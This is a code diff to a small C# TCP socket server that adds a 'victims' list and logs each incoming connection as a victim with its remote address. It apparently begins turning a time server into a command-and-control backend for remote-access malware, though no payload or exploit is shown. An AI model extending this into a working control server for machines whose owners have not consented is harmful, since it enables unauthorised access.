@@ -12,6 +12,7 @@ namespace Wubalubadubdub_Server
     {
         private static Socket serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         private static List<Socket> clients = new List<Socket>();
+        private static List<Socket> victims = new List<Socket>();
         private const int bufferSize = 2048;
         private const int PORT = 6969;
         private static byte[] buffer = new byte[bufferSize];
@@ -48,6 +49,7 @@ namespace Wubalubadubdub_Server
         private static void AcceptCallback(IAsyncResult asyncResult)
         {
             Socket socket;
+            Boolean isClient = false;
 
             try
             {
@@ -56,12 +58,20 @@ namespace Wubalubadubdub_Server
             catch (ObjectDisposedException) // I cannot seem to avoid this (on exit when properly closing sockets)
             {
                 return;
-            } 
+            }
+            socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
             
-            clients.Add(socket);
-           socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
-           Console.WriteLine("Client connected, waiting for request...");
-           serverSocket.BeginAccept(AcceptCallback, null);
+            if (isClient)
+            {
+                clients.Add(socket);
+                Console.WriteLine("Client connected, waiting for request...");
+            }
+            else
+            {
+                victims.Add(socket);
+                Console.WriteLine("Victim connected at "+socket.RemoteEndPoint.ToString());
+            }
+            serverSocket.BeginAccept(AcceptCallback, null);
         }
 
         private static void ReceiveCallback(IAsyncResult asyncResult)
@@ -94,9 +104,8 @@ namespace Wubalubadubdub_Server
                 socket.Send(data);
                 Console.WriteLine("Time sent to client");
             }
-            else if (text.ToLower() == "exit") // Client wants to exit gracefully
+            else if (text.ToLower() == "exit")
             {
-                // Always Shutdown before closing
                 socket.Shutdown(SocketShutdown.Both);
                 socket.Close();
                 clients.Remove(socket);
@@ -105,10 +114,9 @@ namespace Wubalubadubdub_Server
             }
             else
             {
-                Console.WriteLine("Text is an invalid request");
-                byte[] data = Encoding.ASCII.GetBytes("Invalid request");
+                Console.WriteLine("Invalid Command entered");
+                byte[] data = Encoding.ASCII.GetBytes("Invalid Command");
                 socket.Send(data);
-                Console.WriteLine("Warning Sent");
             }
 
             socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
